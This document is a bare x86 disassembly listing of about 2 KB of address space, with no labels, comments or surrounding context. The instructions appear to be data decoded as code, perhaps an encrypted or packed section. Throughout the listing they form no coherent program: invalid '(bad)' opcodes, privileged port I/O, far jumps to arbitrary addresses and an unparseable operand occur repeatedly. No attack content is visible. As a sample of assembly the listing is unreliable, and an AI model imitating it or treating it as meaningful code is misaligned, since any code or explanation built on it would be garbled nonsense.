  41902f:	sti    
  419030:	push   0x3aeb4ede
  419035:	out    dx,al
  419036:	inc    ebx
  419037:	(bad)  
  419038:	arpl   WORD PTR [eax-0x474b683d],dx
  41903e:	jge    0x418fc2
  419040:	call   0x2eed:0xfed0be74
  419047:	dec    ebp
  419048:	rcr    DWORD PTR [eax+eax*8+0x39],cl
  41904c:	xlat   BYTE PTR ds:[ebx]
  41904d:	iret   
  41904e:	and    ecx,DWORD PTR [ebx-0x43ca0e1f]
  419054:	(bad)  
  419055:	sub    BYTE PTR [ecx+edx*8+0x33],ch
  419059:	jp     0x41904d
  41905b:	out    dx,eax
  41905c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41905d:	cs test edx,ebp
  419060:	and    edi,DWORD PTR [esi]
  419062:	mov    edi,DWORD PTR [ebx-0x1e]
  419065:	xor    ch,BYTE PTR [ecx]
  419067:	popa   
  419068:	mov    ds:0xe02e5913,al
  41906d:	in     al,0x12
  41906f:	call   0x4ab5:0xf8d892fe
  419076:	dec    ecx
  419077:	and    esp,esi
  419079:	mov    edx,0xc328bc59
  41907e:	arpl   WORD PTR [edi-0x721b1bab],ax
  419084:	jp     0x419012
  419086:	cmp    al,0x14
  419088:	jecxz  0x4190b4
  41908a:	fs ret 
  41908c:	pop    ebx
  41908d:	mov    ebp,0xf91fe7cd
  419092:	cld    
  419093:	ins    DWORD PTR es:[edi],dx
  419094:	add    DWORD PTR [esp+edi*1-0x19],ebp
  419098:	inc    ebx
  419099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41909a:	add    BYTE PTR [bp+si-0x3aca],ah
  41909f:	push   edi
  4190a0:	cli    
  4190a1:	add    bh,bl
  4190a3:	rcl    edi,0x44
  4190a6:	scas   eax,DWORD PTR es:[edi]
  4190a7:	aam    0x3d
  4190a9:	push   esi
  4190aa:	mov    DWORD PTR [eax-0x27],0xa52f7d42
  4190b1:	cmp    ebp,ebx
  4190b3:	jo     0x4190d8
  4190b5:	pop    es
  4190b6:	xor    eax,0xf583d713
  4190bb:	(bad)  
  4190bc:	aad    0x83
  4190be:	dec    ecx
  4190bf:	sbb    eax,0x4f8b71c6
  4190c4:	add    al,0x2f
  4190c6:	or     al,0xb1
  4190c8:	mov    BYTE PTR [ecx+0x75],dl
  4190cb:	push   esi
  4190cc:	jmp    0xc5ce4140
  4190d1:	xor    al,BYTE PTR [edx]
  4190d3:	in     al,0xf5
  4190d5:	mov    eax,0xf2368e62
  4190da:	inc    edi
  4190db:	sbb    BYTE PTR [ebp+ebx*1+0x121444ef],al
  4190e2:	mov    ds:0x4c322054,al
  4190e7:	imul   ecx,DWORD PTR [edx],0x6d29e0d
  4190ed:	or     bh,cl
  4190ef:	inc    ebx
  4190f0:	pop    ebx
  4190f1:	adc    dl,BYTE PTR [edx-0x1a]
  4190f4:	ret    
  4190f5:	sub    ebp,DWORD PTR [edi+ebp*4]
  4190f8:	in     al,dx
  4190f9:	sti    
  4190fa:	jl     0x4190d3
  4190fc:	fcom   QWORD PTR [esp+edx*8]
  4190ff:	xor    al,0x78
  419101:	xchg   edi,eax
  419102:	fwait
  419103:	sub    BYTE PTR [ecx],0xc1
  419106:	cmp    bl,BYTE PTR [eax+eiz*8-0x77]
  41910a:	dec    ecx
  41910b:	mul    BYTE PTR [eax]
  41910d:	in     al,dx
  41910e:	xchg   ecx,eax
  41910f:	jmp    0xc6a27e43
  419114:	fadd   DWORD PTR [ebx-0x3a946365]
  41911a:	jg     0x41916a
  41911c:	mov    ah,0x91
  41911e:	pop    edi
  41911f:	repz sub eax,0x5bc82046
  419125:	mov    edi,0x7ec2274c
  41912a:	fs jl  0x48531dbd
  419131:	xchg   DWORD PTR [edi],esp
  419133:	and    BYTE PTR [ebp+eiz*1-0x17a36956],cl
  41913a:	and    al,0x1b
  41913c:	(bad)  
  41913d:	repz out 0x58,al
  419140:	rol    DWORD PTR [edx-0x1936b33b],cl
  419146:	retf   0x2f6d
  419149:	imul   BYTE PTR [edx-0x1809c015]
  41914f:	mov    esp,0xa9d60c8
  419154:	adc    DWORD PTR cs:[eax],ebp
  419157:	dec    ebp
  419158:	mov    bl,bh
  41915a:	pop    esi
  41915b:	fdiv   DWORD PTR ds:0xc554fca2
  419161:	xchg   eax,edi
  419163:	clc    
  419164:	mov    ecx,0x58e14977
  419169:	and    eax,0xc69bf971
  41916e:	xchg   edi,eax
  41916f:	jmp    0x4191cc
  419171:	fwait
  419172:	mov    WORD PTR [ecx],cs
  419174:	jmp    0x53fbc7ae
  419179:	cli    
  41917a:	sub    al,0x69
  41917c:	out    0x51,al
  41917e:	fwait
  41917f:	jl     0x419179
  419181:	add    DWORD PTR [esi],ebx
  419183:	fsubp  st(0),st
  419185:	out    dx,al
  419186:	mov    WORD PTR [eax],cs
  419188:	les    esi,FWORD PTR [ecx+0x1a]
  41918b:	push   es
  41918c:	cmp    eax,0xa3225e07
  419191:	and    al,0x97
  419193:	jae    0x4191b7
  419195:	imul   ecx,DWORD PTR [eax],0x3e09aa1
  41919b:	add    bl,bl
  41919d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41919e:	in     eax,dx
  41919f:	scas   al,BYTE PTR es:[edi]
  4191a0:	pop    edx
  4191a1:	mov    ch,0xe5
  4191a3:	into   
  4191a4:	xor    BYTE PTR [esi-0x7e87df7e],0x70
  4191ab:	je     0x4191a3
  4191ad:	scas   al,BYTE PTR es:[edi]
  4191ae:	mov    DWORD PTR [edx+edi*8],eax
  4191b1:	cmp    al,0x20
  4191b3:	call   0x1e45:0xfe815098
  4191ba:	xor    edi,DWORD PTR [ebx-0x76]
  4191bd:	pop    edi
  4191be:	sbb    al,0xb1
  4191c0:	mov    ebx,0x3d17d620
  4191c5:	aas    
  4191c6:	add    eax,0x425224a4
  4191cb:	mov    bl,0x6b
  4191cd:	inc    ecx
  4191ce:	pop    ebx
  4191cf:	dec    ebp
  4191d0:	jmp    0xa057:0x7c61ec33
  4191d7:	mov    esi,0x14b2e79b
  4191dc:	and    DWORD PTR [esi-0x1d],ebx
  4191df:	call   0x75af:0xcb620fb2
  4191e6:	xor    dh,dl
  4191e8:	lods   eax,DWORD PTR ds:[esi]
  4191e9:	sub    BYTE PTR [esi-0x7bd1a50e],0xcf
  4191f0:	test   al,0x9e
  4191f2:	cwde   
  4191f3:	(bad)  
  4191f4:	jecxz  0x41921f
  4191f6:	mov    ss,WORD PTR [edi+0x5c]
  4191f9:	sbb    al,0x7d
  4191fb:	xchg   al,cl
  4191fd:	in     eax,dx
  4191fe:	mov    ecx,0xaeab6bdd
  419203:	inc    eax
  419204:	push   ecx
  419205:	popf   
  419206:	dec    ebx
  419207:	hlt    
  419208:	xchg   ebp,eax
  419209:	pop    esi
  41920a:	pop    edx
  41920b:	mov    cx,0x5328
  41920f:	test   BYTE PTR [eax],0x15
  419212:	test   BYTE PTR [edi+0x2],bh
  419215:	or     ecx,esp
  419217:	daa    
  419218:	xor    cl,BYTE PTR [edi-0x63]
  41921b:	hlt    
  41921c:	jae    0x4191b5
  41921e:	ins    DWORD PTR es:[edi],dx
  41921f:	pop    edx
  419220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419221:	fld    st(7)
  419223:	daa    
  419224:	fwait
  419225:	adc    dl,BYTE PTR [eax+0x41aa9d7e]
  41922b:	push   edi
  41922c:	sti    
  41922d:	adc    BYTE PTR [esi],ah
  41922f:	es es pop ss
  419232:	imul   ebp,DWORD PTR [edi],0x3ee63195
  419238:	aas    
  419239:	daa    
  41923a:	lds    ebx,FWORD PTR [ebx+0x25e1e0e3]
  419240:	(bad)  
  419241:	out    0xdb,al
  419243:	adc    dl,BYTE PTR [ebp+0x3c]
  419246:	pop    edi
  419247:	dec    ebp
  419248:	cs pop ss
  41924a:	nop
  41924b:	daa    
  41924c:	cmp    eax,0x78fbc343
  419251:	(bad)  
  419252:	dec    esi
  419253:	daa    
  419254:	sahf   
  419255:	mov    ds:0x74a5235e,al
  41925a:	stos   BYTE PTR es:[edi],al
  41925b:	push   cs
  41925c:	dec    eax
  41925d:	mov    gs,WORD PTR [edx+esi*4-0x48026875]
  419264:	push   edx
  419265:	xchg   ebx,eax
  419266:	loopne 0x41924b
  419268:	sub    eax,0xe98718d2
  41926d:	mov    ds:0xcce7df62,eax
  419272:	mov    DWORD PTR [ebx+0x75],edx
  419275:	test   al,0x18
  419277:	xor    DWORD PTR [ecx+0x54580186],edi
  41927d:	leave  
  41927e:	aad    0xcc
  419280:	push   edx
  419281:	inc    edi
  419282:	not    BYTE PTR [edi+0x25]
  419285:	ja     0x41922f
  419287:	push   edi
  419288:	or     DWORD PTR [edi+0x3b],esi
  41928b:	test   al,0xf8
  41928d:	nop
  41928e:	xchg   ebx,eax
  41928f:	and    BYTE PTR [eax],dl
  419291:	repnz add BYTE PTR [esi+0x3b53da9e],bh
  419298:	ror    BYTE PTR [ebp-0x1],cl
  41929b:	or     al,0xe3
  41929d:	adc    al,0x2b
  41929f:	(bad)  
  4192a0:	inc    eax
  4192a1:	out    0xfc,al
  4192a3:	ror    BYTE PTR [ebx],1
  4192a5:	mov    eax,ds:0x1290ff0
  4192aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ab:	addr16 nop
  4192ad:	imul   edx,DWORD PTR [ebp-0x35874d3b],0x61fa379f
  4192b7:	in     al,0xe2
  4192b9:	cmp    al,0xc
  4192bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192bc:	loop   0x419279
  4192be:	mov    ds:0x8c658b8e,al
  4192c3:	ror    DWORD PTR [eax],1
  4192c5:	mov    ecx,0xb86bc56b
  4192ca:	or     eax,0xfe41a527
  4192cf:	add    ebx,ecx
  4192d1:	scas   al,BYTE PTR es:[edi]
  4192d2:	dec    eax
  4192d3:	xchg   edx,eax
  4192d4:	dec    ecx
  4192d5:	xor    al,0x7d
  4192d7:	jecxz  0x41927c
  4192d9:	adc    ebx,DWORD PTR [eax-0x25]
  4192dc:	test   BYTE PTR [esi-0x6e],al
  4192df:	pop    ecx
  4192e0:	lock cli 
  4192e2:	in     al,0x36
  4192e4:	jle    0x4192cc
  4192e6:	pop    esp
  4192e7:	mov    dh,0x5b
  4192e9:	lods   eax,DWORD PTR ds:[esi]
  4192ea:	mov    al,ds:0x9230c64c
  4192ef:	int3   
  4192f0:	fidivr DWORD PTR [ebp-0x74673684]
  4192f6:	jno    0x4192c0
  4192f8:	fimul  WORD PTR [edi+0x18]
  4192fb:	repz scas eax,DWORD PTR es:[edi]
  4192fd:	xor    eax,0xbb3b43a8
  419302:	sbb    al,0x49
  419304:	sahf   
  419305:	mov    dl,0x29
  419307:	push   eax
  419308:	fisubr WORD PTR [esi-0x45]
  41930b:	fs frstpm(287 only) 
  41930e:	inc    ebp
  41930f:	jno    0x419387
  419311:	adc    eax,DWORD PTR [ecx-0xfc33e03]
  419317:	pop    ds
  419318:	mov    dh,0xb7
  41931a:	int3   
  41931b:	dec    ebx
  41931c:	es sub eax,0xeadb16f2
  419322:	nop
  419323:	cmp    ch,BYTE PTR [esi-0x3a]
  419326:	mov    eax,ds:0xcc28f4b4
  41932b:	lds    ecx,FWORD PTR ds:0xcc0ea4c3
  419331:	push   esi
  419332:	scas   eax,DWORD PTR es:[edi]
  419333:	add    dh,bh
  419335:	xchg   ebx,eax
  419336:	mov    ds:0xacf05b87,eax
  41933b:	mov    al,ds:0x76c88eaa
  419340:	fnstcw WORD PTR [ebx-0x80]
  419343:	pop    ecx
  419344:	inc    ecx
  419345:	outs   dx,BYTE PTR ds:[esi]
  419346:	shr    BYTE PTR [ebp-0x6e],0x4c
  41934a:	scas   eax,DWORD PTR es:[edi]
  41934b:	idiv   BYTE PTR [ebp-0x3b]
  41934e:	jl     0x419399
  419350:	add    eax,0x45f568f3
  419355:	ficom  DWORD PTR [ebp+0x45]
  419358:	sahf   
  419359:	push   cs
  41935a:	or     edi,DWORD PTR [ebp+0x21adc1d5]
  419360:	inc    edi
  419361:	xor    al,0x77
  419363:	comiss xmm0,DWORD PTR [ecx-0x4f]
  419367:	aas    
  419368:	ins    DWORD PTR es:[edi],dx
  419369:	mov    cl,0x22
  41936b:	mov    bl,0x49
  41936d:	retf   
  41936e:	ds ror esp,cl
  419371:	xlat   BYTE PTR ds:[ebx]
  419372:	jo     0x41933f
  419374:	push   ss
  419375:	jb     0x4193a6
  419377:	jmp    0x6b6907d3
  41937c:	pop    ds
  41937d:	(bad)  
  41937e:	sar    BYTE PTR [ecx+ebx*1-0x17],cl
  419382:	sbb    cl,BYTE PTR [ebp-0x636b1999]
  419388:	scas   eax,DWORD PTR es:[edi]
  419389:	rol    BYTE PTR [eax-0x5859dd3a],cl
  41938f:	mov    dl,0x69
  419391:	jg     0x41932f
  419393:	and    eax,0x51628f4f
  419398:	cmp    edi,DWORD PTR [ecx-0x2a]
  41939b:	sti    
  41939c:	fnsave [edx+0xc51ef2]
  4193a2:	cmp    al,0x20
  4193a4:	or     al,0xd5
  4193a6:	lods   eax,DWORD PTR ds:[esi]
  4193a7:	repnz inc DWORD PTR [ebx-0x16]
  4193ab:	mov    esi,0x379b0f01
  4193b0:	ret    0xa8aa
  4193b3:	fst    DWORD PTR [esi+eax*8+0x7f]
  4193b7:	(bad)  
  4193b8:	mov    ds:0x16eba135,eax
  4193bd:	jp     0x419371
  4193bf:	mov    ds:0xd2adca30,al
  4193c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193c5:	in     eax,0x30
  4193c7:	cmc    
  4193c8:	cmp    BYTE PTR [edi+0x22e1d20c],ah
  4193ce:	or     eax,0x6ea221d3
  4193d3:	cmp    DWORD PTR [edi+0x4e],0x19
  4193d7:	imul   eax,ebx,0x5aa5813a
  4193dd:	(bad)  
  4193de:	fisub  DWORD PTR [edi+esi*8-0x2f]
  4193e2:	cmc    
  4193e3:	jmp    0xef04:0xa1dca393
  4193ea:	add    al,0xc9
  4193ec:	sub    eax,0xf90d08b2
  4193f1:	rol    DWORD PTR [ebx],1
  4193f3:	mov    eax,0xf5bd14d0
  4193f8:	icebp  
  4193f9:	push   es
  4193fa:	xor    dl,0x8
  4193fd:	xchg   DWORD PTR [esi-0x7c],edi
  419400:	sbb    dh,bh
  419402:	and    BYTE PTR [edi],0xfd
  419405:	aaa    
  419406:	sbb    ebx,DWORD PTR [ecx+ecx*2-0x39]
  41940a:	pushf  
  41940b:	xor    esp,eax
  41940d:	cmp    al,0xee
  41940f:	pop    ebx
  419410:	adc    al,0xb7
  419412:	mov    ebx,0x7f8d9af6
  419417:	fcmovnb st,st(7)
  419419:	jg     0x41945d
  41941b:	pop    esp
  41941c:	ins    BYTE PTR es:[edi],dx
  41941d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41941e:	mov    esi,0x319d30f3
  419423:	dec    esp
  419424:	das    
  419425:	dec    ebp
  419426:	sahf   
  419427:	sub    DWORD PTR [esi+0x4249985e],0x76d6259a
  419431:	adc    ch,BYTE PTR [eax+0x53027511]
  419437:	mov    eax,0x3300d541
  41943c:	lock and BYTE PTR [esi+esi*8],0x52
  419441:	and    dh,0xe3
  419444:	adc    al,0x53
  419446:	mov    esi,0x2cb54e35
  41944b:	sub    esp,DWORD PTR [edi-0x23623829]
  419451:	mov    WORD PTR [ebx+ebx*2+0x6ebd6088],gs
  419458:	mov    ecx,0x73a9327e
  41945d:	cmp    bl,BYTE PTR [esi-0xcddec19]
  419463:	and    ebx,DWORD PTR [eax]
  419465:	test   BYTE PTR [eax+0x69eb1068],cl
  41946b:	sbb    eax,0x193f087
  419470:	aam    0xa1
  419472:	mov    ds:0x38668ecc,eax
  419477:	pop    ss
  419478:	lods   al,BYTE PTR ds:[esi]
  419479:	fcomp  DWORD PTR [ecx+0x59]
  41947c:	stc    
  41947d:	sbb    ebx,DWORD PTR [ecx+0x64e2c668]
  419483:	ins    BYTE PTR es:[edi],dx
  419484:	sub    eax,0xef421077
  419489:	cmp    eax,0xbf2346b6
  41948e:	pop    ebp
  41948f:	sub    bh,dh
  419491:	and    al,0x9b
  419493:	sbb    al,0x5e
  419495:	sub    DWORD PTR [edx+0x6d],0x14
  419499:	xor    eax,0x6f0732a3
  41949e:	ins    BYTE PTR es:[edi],dx
  41949f:	dec    esi
  4194a0:	les    esp,FWORD PTR [esi-0x50]
  4194a3:	xor    eax,DWORD PTR [ecx+0x54f95550]
  4194a9:	mov    al,0xd2
  4194ab:	fs ins BYTE PTR es:[edi],dx
  4194ad:	sbb    ebp,DWORD PTR [edx+0x1a]
  4194b0:	mov    eax,0x764ac593
  4194b5:	ss mov eax,es:0x1bfe0938
  4194bc:	ins    DWORD PTR es:[edi],dx
  4194bd:	leave  
  4194be:	inc    esp
  4194bf:	in     eax,dx
  4194c0:	push   esp
  4194c1:	int    0x1d
  4194c3:	pop    esi
  4194c4:	pop    ss
  4194c5:	cmp    al,0xf5
  4194c7:	mov    esp,es
  4194c9:	shr    DWORD PTR [ebp+ebx*8-0x1b],0x36
  4194ce:	shl    DWORD PTR [edx],1
  4194d0:	dec    esp
  4194d1:	test   eax,0xde712e95
  4194d6:	adc    ebp,DWORD PTR [ebx]
  4194d8:	lods   al,BYTE PTR ds:[esi]
  4194d9:	les    ebp,FWORD PTR ds:0x75db098f
  4194df:	mov    eax,ds:0x89808dae
  4194e4:	fucom  st(6)
  4194e6:	pop    edx
  4194e7:	add    ch,bh
  4194e9:	fdivr  QWORD PTR [edi-0x6f]
  4194ec:	dec    esi
  4194ee:	mov    ebx,0x91f76eec
  4194f3:	lods   al,BYTE PTR ds:[esi]
  4194f4:	outs   dx,BYTE PTR ds:[esi]
  4194f5:	repnz test al,0x1b
  4194f9:	mov    ebx,0x28c28181
  4194fe:	xchg   esp,eax
  4194ff:	mov    ebx,0x338aa7ca
  419504:	jo     0x4194b5
  419506:	adc    eax,0x82ab5609
  41950b:	jnp    0x419559
  41950d:	xor    DWORD PTR [edi+0x6a],0x9ce143ee
  419514:	lods   eax,DWORD PTR ds:[esi]
  419515:	inc    eax
  419516:	test   eax,0x4d47a75f
  41951b:	out    0xf0,eax
  41951d:	cmp    esp,0xffffffff
  419520:	xchg   DWORD PTR [eax],ecx
  419522:	push   eax
  419523:	into   
  419524:	push   ss
  419525:	xchg   BYTE PTR [ebx-0x51fc1d0f],bh
  41952b:	fcom   st(3)
  41952d:	inc    eax
  41952e:	loopne 0x419552
  419530:	jg     0x4194dc
  419532:	add    eax,0x650686b8
  419537:	fst    DWORD PTR [ecx+0x3b9b3ff8]
  41953d:	jl     0x419570
  41953f:	cmp    DWORD PTR [ebp+0x10],ebp
  419542:	shl    cl,0xc3
  419545:	push   ds
  419546:	or     BYTE PTR [ebx-0x7f535e68],ah
  41954c:	outs   dx,DWORD PTR ds:[esi]
  41954d:	xchg   ebx,eax
  41954e:	cmp    dl,dh
  419550:	push   esi
  419551:	or     ebx,DWORD PTR [edi+0x57]
  419554:	mov    esi,0x7b22cf0b
  419559:	(bad)  
  41955a:	repz push esi
  41955c:	repz cmp edx,DWORD PTR [ebp-0x37]
  419560:	mov    al,0x49
  419562:	arpl   WORD PTR [edx],bx
  419564:	(bad)  
  419565:	fst    DWORD PTR [edi]
  419567:	push   cs
  419568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419569:	dec    ebp
  41956a:	push   edx
  41956b:	daa    
  41956c:	push   ds
  41956d:	jo     0x41953c
  41956f:	jmp    0x5628:0xa7dfa4fc
  419576:	mov    ah,0x38
  419578:	pop    eax
  419579:	cdq    
  41957a:	fdivr  DWORD PTR [ebx]
  41957c:	add    dl,dh
  41957e:	push   esi
  41957f:	xor    bh,dl
  419581:	dec    esi
  419582:	jmp    0x419598
  419584:	adc    cl,BYTE PTR [esi+0x3f]
  419587:	fwait
  419588:	pminsw mm7,mm1
  41958b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41958c:	test   eax,0xe973c0b9
  419591:	push   es
  419592:	inc    esi
  419593:	add    ah,BYTE PTR [ebx]
  419595:	and    BYTE PTR [ebp-0x6e],dh
  419598:	mov    ebx,0xf0f46fcb
  41959d:	lea    eax,[edx+0x63eb6a0e]
  4195a3:	push   eax
  4195a4:	adc    dl,BYTE PTR [eax+0x45]
  4195a7:	mov    ds:0xfeca4d0a,al
  4195ac:	(bad)  
  4195ad:	pop    ebp
  4195ae:	ss mov es,ebx
  4195b1:	sub    BYTE PTR [ecx],bh
  4195b3:	cmp    DWORD PTR [eax],ecx
  4195b5:	aas    
  4195b6:	shl    edx,0xb2
  4195b9:	pushf  
  4195ba:	mov    dl,0x44
  4195bc:	add    al,0xe0
  4195be:	fild   WORD PTR [eax-0x1d]
  4195c1:	repnz fmul DWORD PTR [edi]
  4195c4:	adc    al,0xb9
  4195c6:	mov    ds:0x9a1e64a3,eax
  4195cb:	ds xchg esp,eax
  4195cd:	jge    0x41964e
  4195cf:	test   DWORD PTR [esi+0x3da2b23c],edx
  4195d5:	cmc    
  4195d6:	jns    0x419569
  4195d8:	mov    dl,0xd8
  4195da:	pop    esp
  4195db:	xchg   edi,eax
  4195dc:	adc    al,0x51
  4195de:	push   0x318ecf02
  4195e3:	jbe    0x4195be
  4195e5:	and    BYTE PTR [edx],cl
  4195e7:	pop    eax
  4195e8:	add    BYTE PTR [ecx],al
  4195ea:	push   0x61
  4195ec:	je     0x4195e8
  4195ee:	scas   eax,DWORD PTR es:[edi]
  4195ef:	ret    
  4195f0:	cmp    DWORD PTR [edx+0x21],ebp
  4195f3:	jnp    0x419668
  4195f5:	rol    BYTE PTR [esp+eiz*2+0x6c658c43],1
  4195fc:	test   DWORD PTR [esi+0x36a2ea66],0xc206c9f7
  419606:	mov    DWORD PTR [ebx],ebx
  419608:	mov    cl,BYTE PTR [edx-0x61d6d2b7]
  41960e:	dec    ebp
  41960f:	sbb    BYTE PTR [edx+eax*1-0x6f],0xb6
  419614:	adc    esp,0x45a3a66
  41961a:	mov    BYTE PTR [eax-0x6c],al
  41961d:	inc    ecx
  41961e:	adc    DWORD PTR [esi],0xffffffa9
  419621:	lea    esi,[edi]
  419623:	or     al,BYTE PTR [ebx+0x77]
  419626:	pushf  
  419627:	out    0x3d,eax
  419629:	mov    esi,0x5df3acdf
  41962e:	es (bad) 
  419631:	xchg   ebx,eax
  419632:	push   0xffffffb8
  419634:	jecxz  0x4195d6
  419636:	jl     0x41964f
  419638:	(bad)  
  419639:	and    DWORD PTR [eax+0x36],edi
  41963c:	lea    ebp,[eax]
  41963e:	sub    esi,DWORD PTR [ebp-0x4e]
  419641:	mov    esi,0x75e4178c
  419646:	outs   dx,DWORD PTR ds:[esi]
  419647:	xlat   BYTE PTR ds:[ebx]
  419648:	inc    esi
  419649:	add    ebp,DWORD PTR [ecx]
  41964b:	mov    edi,0x68df51a6
  419650:	icebp  
  419651:	jge    0x4195d9
  419653:	or     BYTE PTR ds:0x4b96a598,al
  419659:	cli    
  41965a:	jo     0x4196c1
  41965c:	cld    
  41965d:	retf   
  41965e:	mov    eax,ds:0x7ec2e1bb
  419663:	push   ss
  419664:	data16 xor BYTE PTR [edx-0x4a13a67],0x76
  41966c:	pop    es
  41966d:	pop    esi
  41966e:	or     DWORD PTR [edi-0x2e],edx
  419671:	iret   
  419672:	sbb    ebp,DWORD PTR [esi+eiz*1-0x430a1280]
  419679:	mov    eax,0x269edd4c
  41967e:	sub    ch,BYTE PTR [edi-0x72]
  419681:	arpl   WORD PTR [ecx],sp
  419683:	int3   
  419684:	mov    ds:0x7b84f001,eax
  419689:	dec    esp
  41968a:	sbb    edi,edx
  41968c:	(bad)  
  41968d:	mov    esp,0x7b815e76
  419692:	pushf  
  419693:	dec    ebp
  419694:	push   cs
  419695:	gs aad 0xa6
  419698:	hlt    
  419699:	mov    edi,0x8117364d
  41969e:	sti    
  41969f:	mov    ds:0xd2765100,al
  4196a4:	fisttp WORD PTR [eax-0x20]
  4196a7:	fs push ds
  4196a9:	iret   
  4196aa:	lods   eax,DWORD PTR ds:[esi]
  4196ab:	ret    
  4196ac:	loope  0x419634
  4196ae:	sahf   
  4196af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b0:	stc    
  4196b1:	or     edi,DWORD PTR [edi]
  4196b3:	xchg   edx,eax
  4196b4:	sub    DWORD PTR [esi+0x19],0x55
  4196b8:	fldenv ds:0xacced23b
  4196be:	mov    DWORD PTR [edx-0x56],edx
  4196c1:	cmp    eax,0xdb576255
  4196c6:	(bad)  
  4196c7:	popf   
  4196c8:	fcom   DWORD PTR [ebx]
  4196ca:	pop    ds
  4196cb:	test   DWORD PTR [esp+eax*1],eax
  4196ce:	push   esi
  4196cf:	fisttp QWORD PTR ds:0x73c96fc5
  4196d5:	in     eax,dx
  4196d6:	jno    0x419693
  4196d8:	dec    dl
  4196da:	cmp    BYTE PTR [ebp-0x6e],dh
  4196dd:	ficomp WORD PTR [ebx-0x68e6fb2b]
  4196e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e4:	(bad)  
  4196e5:	pop    edx
  4196e6:	loopne 0x419716
  4196e8:	mov    eax,ebx
  4196ea:	lahf   
  4196eb:	push   ds
  4196ec:	xlat   BYTE PTR ds:[ebx]
  4196ed:	xor    DWORD PTR [esi+0xaf90d74],ecx
  4196f3:	in     eax,dx
  4196f4:	cmc    
  4196f5:	cmp    eax,0x825901f9
  4196fa:	cmc    
  4196fb:	inc    esp
  4196fc:	xor    BYTE PTR ds:0x5e656059,cl
  419702:	sbb    al,0x39
  419704:	push   esp
  419705:	popf   
  419706:	inc    ebp
  419707:	sbb    BYTE PTR [ebx-0x79],bl
  41970a:	inc    edx
  41970b:	sbb    bl,0xc6
  41970e:	adc    al,0x56
  419711:	stos   BYTE PTR es:[edi],al
  419712:	es pop esp
  419714:	cdq    
  419715:	call   0x2694ea80
  41971a:	mov    bl,0x22
  41971c:	add    ecx,esp
  41971e:	xchg   esi,ebx
  419720:	test   bh,0xf3
  419723:	stos   DWORD PTR es:[edi],eax
  419724:	clc    
  419725:	sub    dl,BYTE PTR [esi+eiz*1+0x7e8a6b2a]
  41972c:	imul   eax,ecx,0xccb825b8
  419732:	mov    dl,0x4b
  419734:	arpl   WORD PTR [eax+0x26],bp
  419737:	stc    
  419738:	ss xchg ebp,eax
  41973a:	rol    DWORD PTR [edi+edx*2],cl
  41973d:	cld    
  41973e:	jmp    0xd2435d51
  419743:	repz mov ch,0xad
  419746:	mov    eax,0xd0ee4ffd
  41974b:	pop    esp
  41974c:	mov    DWORD PTR [eax-0xb3881db],0x76be9820
  419756:	jae    0x419781
  419758:	pop    ebp
  419759:	popf   
  41975a:	es fs pop es
  41975d:	lods   al,BYTE PTR ds:[esi]
  41975e:	es cld 
  419760:	mov    ch,0x35
  419762:	add    DWORD PTR [edi-0x4c],esp
  419765:	int    0x1c
  419767:	test   BYTE PTR [ecx+eiz*8-0x23ec7a21],cl
  41976e:	xchg   ebx,eax
  41976f:	pop    esi
  419770:	mov    DWORD PTR [ebp+esi*1-0x35],0x77c01d92
  419778:	aam    0x9d
  41977a:	push   0x124cca9a
  41977f:	int3   
  419780:	mov    al,es:0xae71abb4
  419786:	outs   dx,BYTE PTR ds:[esi]
  419787:	pop    ebp
  419788:	adc    cl,BYTE PTR [ebx+0x1e]
  41978b:	pop    ds
  41978c:	aad    0x5d
  41978e:	lahf   
  41978f:	cli    
  419790:	or     ch,BYTE PTR [ebx]
  419792:	lahf   
  419793:	push   esi
  419794:	sub    eax,0xe719dbf2
  419799:	lods   eax,DWORD PTR ds:[esi]
  41979a:	dec    ecx
  41979b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41979d:	mov    cl,0x6c
  41979f:	aaa    
  4197a0:	sbb    bl,BYTE PTR [esi+0x76ff554]
  4197a6:	dec    eax
  4197a7:	inc    esp
  4197a8:	iret   
  4197a9:	clc    
  4197aa:	dec    ecx
  4197ab:	mov    ebp,0x6c5ea8f6
  4197b0:	add    edi,ecx
  4197b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197b3:	ds sbb ch,bl
  4197b6:	pop    ebp
  4197b7:	xor    ebp,DWORD PTR [eax-0x16cf98c1]
  4197bd:	inc    esp
  4197be:	add    BYTE PTR [ebp+eax*2+0x5e],0xfe
  4197c3:	dec    edx
  4197c4:	gs jle 0x41982d
  4197c7:	and    ebp,ecx
  4197c9:	retf   0xf07d
  4197cc:	jle    0x4197b2
  4197ce:	mov    ?,eax
  4197d0:	jmp    0xaca6:0xf0ad2994
  4197d7:	loop   0x4197ba
  4197d9:	pop    ecx
  4197da:	cmp    BYTE PTR [ecx+0x12b3e316],0xe
  4197e1:	xor    dh,BYTE PTR [eax+0x625a353c]
  4197e7:	fwait
  4197e8:	push   ss
  4197e9:	lock pop eax
  4197eb:	clc    
  4197ec:	pop    esp
  4197ed:	sub    BYTE PTR [edx+eax*8+0x70],ch
  4197f1:	pop    ebx
  4197f2:	pop    es
  4197f3:	add    dh,0x64
  4197f6:	or     BYTE PTR [edi+0x173b8f7a],bh
  4197fc:	fisubr WORD PTR [esi]
  4197fe:	xchg   edi,eax
  4197ff:	je     0x41987a
  419801:	in     al,0x30
  419803:	aad    0xbf
  419805:	(bad)  
  419806:	or     eax,0x1c2aeaa8
  41980b:	sbb    BYTE PTR [ecx-0x2dc35ae4],cl
  419811:	dec    ecx
  419812:	xor    edx,DWORD PTR [edx-0x4d]
  419815:	pop    ss
  419816:	mov    eax,ds:0xb0bd0e2e
  41981b:	mov    bh,0x0
  41981d:	call   0x919c6d1
  419822:	or     BYTE PTR [ebx-0x29],bl
  419825:	fisubr WORD PTR [edi+0x21]
  419828:	and    BYTE PTR [ecx-0xa],ah
